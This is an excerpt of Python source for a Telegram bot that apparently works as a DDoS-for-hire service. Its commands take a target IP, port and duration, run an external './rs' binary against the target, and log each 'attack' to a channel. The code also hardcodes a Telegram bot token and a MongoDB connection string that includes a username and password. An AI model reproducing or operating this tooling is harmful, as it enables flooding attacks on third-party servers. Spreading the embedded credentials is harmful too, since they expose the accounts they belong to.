...
TOKEN = "7313441828:AAGyH9UutZm08HAWkOgk8-3FN_2-8QvyROk"
MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
FORWARD_CHANNEL_ID = -1002230386019
CHANNEL_ID = -1002230386019
error_channel_id = -1002230386019
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./rs {target_ip} {target_port} {duration}"
    try:
...
def process_attack_command(message):
    try:
        ...
        # Forward the attack details to the channel
        attack_details_message = f"Attack initiated by user {message.from_user.id}:\n\nTarget IP: {target_ip}\nTarget Port: {target_port}\nDuration: {duration} seconds"
        bot.send_message(CHANNEL_ID, attack_details_message, parse_mode='Markdown')
...
def send_welcome(message):
    ...
    btn5 = KeyboardButton("🍺 @SHARP_X_OWNER")
    btn6 = KeyboardButton("")
...
if __name__ == "__main__":
    ...
    logging.info("REDOX SERVER RUNNING.....")
    while True:
        try:
